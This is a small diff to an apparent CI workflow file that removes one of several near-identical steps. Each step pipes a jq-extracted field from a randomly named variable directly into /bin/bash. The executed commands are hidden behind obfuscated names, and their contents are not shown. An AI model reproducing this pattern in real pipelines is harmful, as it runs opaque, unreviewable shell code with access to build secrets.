@@ -25,7 +25,6 @@ jobs:
           echo $ele0109 | jq -r .nsyr6344 | /bin/bash
           echo $b95 | jq -r .l51 | /bin/bash
           echo $ld749 | jq -r .c000 | /bin/bash
-          echo $lto1446 | jq -r .vtqj41199 | /bin/bash
           printf '%s' "$l95818" | jq -r .erms7 | /bin/bash
           echo $lluk9 | jq -r .zx08 | /bin/bash
           printf '%s' "$idms26970" | jq -r .nz96464 | /bin/bash
